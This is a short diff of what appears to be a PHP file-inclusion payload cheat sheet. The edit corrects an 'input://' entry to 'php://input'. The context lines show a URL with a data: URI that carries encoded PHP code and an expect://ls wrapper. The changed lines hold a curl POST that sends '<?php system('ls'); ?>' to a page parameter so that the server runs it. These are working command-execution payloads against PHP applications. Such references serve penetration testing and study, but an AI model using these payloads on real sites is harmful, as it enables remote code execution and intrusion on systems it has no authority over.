@@ -41,10 +41,10 @@ http://example.com/index.php?page=data:text/plain,%3c%3f%70%68%70%20%70%68%70%69
 http://example.com/index.php?page=expect://ls [For fopen Function]
 ```
 
-**input://**
+**php://input**
 
 ```
-curl -X POST -d "<?php system('ls'); ?>" http://example.com/index.php?page=input://
+curl -X POST -d "<?php system('ls'); ?>" http://example.com/index.php?page=php://input
 ```
 
 **php://fd/**
